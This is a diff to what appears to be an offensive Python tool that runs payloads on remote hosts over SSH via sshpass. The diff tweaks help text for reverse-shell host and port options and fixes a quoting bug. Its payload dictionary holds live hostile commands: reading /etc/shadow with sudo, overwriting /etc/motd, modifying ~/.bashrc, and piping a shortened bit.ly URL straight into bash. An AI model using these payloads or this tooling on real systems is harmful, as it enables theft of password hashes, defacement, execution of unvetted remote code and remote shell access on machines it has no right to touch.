@@ -25,9 +25,9 @@ parser.add_argument('--payload', type=str, default='whoami',
 		    help='(Name of, or raw) Payload [ex. reverse_shell or \'whoami\']')
 
 parser.add_argument('-H', dest='host', type=str,
-                    help='(If using nc reverse_shell payload) Host for reverse shell')
+                    help='(If using reverse_shell payload) Host for reverse shell')
 parser.add_argument('-P', dest='port', type=str,
-                    help='(If using nc reverse_shell payload) Port for reverse shell')
+                    help='(If using reverse_shell payload) Port for reverse shell')
 
 parser.add_argument('--safe', action='store_true',
 		   help='Print sshpass command, but don\'t execute it')
@@ -44,7 +44,7 @@ payloads={
 'gitpip':'sudo apt -y install git python-pip',
 'shadow':'sudo cat /etc/shadow',
 'motd':'echo "CHANGE YOUR PASSWORD" > /etc/motd',
-'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat >> ~/.bashrc',
+'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat" >> ~/.bashrc',
 'rickroll':'curl -s -L http://bit.ly/10hA8iC | bash'
 }
 
